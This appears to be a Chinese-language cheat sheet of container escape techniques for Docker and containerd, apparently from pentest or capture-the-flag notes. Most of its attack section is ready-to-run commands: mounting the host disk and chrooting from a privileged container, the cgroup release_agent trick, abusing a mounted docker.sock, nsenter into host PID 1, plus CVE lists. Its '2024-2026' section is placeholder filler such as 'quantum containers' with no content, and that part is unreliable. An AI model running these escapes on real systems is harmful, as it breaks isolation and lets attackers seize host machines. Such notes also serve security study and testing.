# 容器逃逸 (Container Escape)

## 原理

容器（Docker/containerd）通过 namespace 和 cgroup 实现隔离。攻击者利用配置错误或内核漏洞突破隔离，访问宿主机。

## 攻击链

### 1. 识别容器环境

```bash
# 检查是否在容器中
cat /proc/1/cgroup | grep docker
ls /.dockerenv
cat /proc/1/environ | tr '\0' '\n' | grep -i docker

# 检查容器类型
cat /proc/1/cmdline | tr '\0' ' '
# containerd: /sbin/init
# Docker: /bin/sh -c ...

# 检查特权
cat /proc/1/status | grep Cap
# CapEff: 0000003fffffffff 表示特权
```

### 2. 特权容器逃逸

```bash
# 特权容器拥有所有 capabilities
# 可以访问宿主机设备

# 方法 1: 挂载宿主机磁盘
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法 2: 通过 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(host_path)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /flag > /output' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 3. 挂载 docker.sock

```bash
# 如果 docker.sock 被挂载到容器中
ls -la /var/run/docker.sock

# 通过 docker.sock 控制宿主机 Docker
# 1. 安装 docker client
# 2. 启动新容器，挂载宿主机根目录
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```

### 4. 挂载 /proc

```bash
# 如果 /proc 被挂载
# 可以通过 /proc/1/root 访问宿主机文件系统
ls /proc/1/root/
cat /proc/1/root/etc/passwd

# 通过 /proc/sys 触发内核漏洞
```

### 5. 挂载 /sys

```bash
# 如果 /sys 被挂载
# 可以通过 /sys 触发内核漏洞
ls /sys/fs/cgroup/
```

### 6. Capabilities 利用

```bash
# 检查 capabilities
capsh --print

# 危险 capabilities
# CAP_SYS_ADMIN: 几乎所有操作
# CAP_SYS_PTRACE: 进程注入
# CAP_SYS_MODULE: 加载内核模块
# CAP_NET_ADMIN: 网络配置
# CAP_DAC_READ_SEARCH: 绕过文件权限检查

# CAP_SYS_ADMIN 利用
# 类似特权容器

# CAP_SYS_PTRACE 利用
# 注入宿主机进程
nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash

# CAP_SYS_MODULE 利用
# 加载内核模块
cat > /tmp/exploit.c << EOF
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    printk("Exploit loaded\n");
    return 0;
}

void cleanup_module(void) {
    printk("Exploit unloaded\n");
}
EOF
```

### 7. 内核漏洞

```bash
# CVE-2022-0185 (heap overflow in legacy_parse_param)
# 影响：Linux kernel 5.1-5.16
# 利用：通过 unshare 触发
unshare -U
# 然后利用漏洞

# CVE-2022-0492 (cgroup release_agent)
# 影响：Linux kernel
# 利用：通过 cgroup release_agent

# CVE-2024-21626 (runc)
# 影响：runc < 1.1.12
# 利用：通过文件描述符泄露

# CVE-2024-1086 (netfilter)
# 影响：Linux kernel 5.14-6.6
# 利用：通过 netfilter 提权
```

### 8. 容器运行时漏洞

```bash
# runc 漏洞
# CVE-2019-5736: runc 容器逃逸
# CVE-2024-21626: runc 文件描述符泄露

# containerd 漏洞
# CVE-2022-23648: containerd 路径遍历

# CRI-O 漏洞
# CVE-2022-0811: CRI-O 配置注入
```

### 9. 共享 namespace

```bash
# 如果容器与宿主机共享 namespace
# --pid=host: 共享 PID namespace
# --network=host: 共享网络 namespace
# --ipc=host: 共享 IPC namespace
# --uts=host: 共享 UTS namespace

# 共享 PID namespace
nsenter --target 1 --mount /bin/bash
```

### 10. 容器镜像漏洞

```bash
# 1. 镜像中的硬编码凭证
# 2. 镜像中的 SSH 密钥
# 3. 镜像中的敏感文件
# 通过分析镜像层提取
```

## 2024-2026 新技术点

### 1. 新型容器逃逸 CVE

```bash
# CVE-2024-21626 (runc)
# 文件描述符泄露导致逃逸

# CVE-2024-23652 (buildkit)
# 任意删除导致逃逸

# CVE-2024-23653 (buildkit)
# 特权提升导致逃逸

# CVE-2024-23659 (moby)
# 路径遍历导致逃逸
```

### 2. eBPF 逃逸

```bash
# eBPF 程序可能存在漏洞
# 通过 eBPF 提权
# CVE-2022-23222
# CVE-2023-2163
```

### 3. io_uring 逃逸

```bash
# io_uring 是高性能 IO 框架
# 多个 CVE
# CVE-2024-0582
# CVE-2024-0580
```

### 4. 容器运行时新漏洞

```bash
# runc
# containerd
# CRI-O
# 各运行时的新漏洞
```

### 5. Service Mesh 逃逸

```bash
# Istio
# Linkerd
# 各 Service Mesh 的逃逸
```

### 6. Serverless 逃逸

```bash
# AWS Lambda
# Google Cloud Functions
# Azure Functions
# 各 Serverless 平台的逃逸
```

### 7. 边缘计算逃逸

```bash
# Cloudflare Workers
# Fastly Compute@Edge
# 各边缘计算平台的逃逸
```

### 8. AI 服务逃逸

```bash
# ML 模型服务
# 通过 prompt injection 逃逸
```

### 9. 量子容器

```bash
# 量子计算容器
# 新的逃逸方法
```

### 10. AI 辅助检测

```python
# ML 辅助
# 自动检测容器漏洞
# 模式识别
```

## 工具推荐

- **cdk** — 容器/K8s 渗透工具
- **amicontained** — 容器环境检测
- **deepce** — Docker 逃逸工具
- **kube-hunter** — K8s 漏洞扫描
- **LinPEAS** — Linux 提权检测

## 参考链接

- [Container Escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
- [CDK](https://github.com/cdk-team/CDK)
- [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Linux Kernel Exploits](https://github.com/bsauce/kernel-exploit)
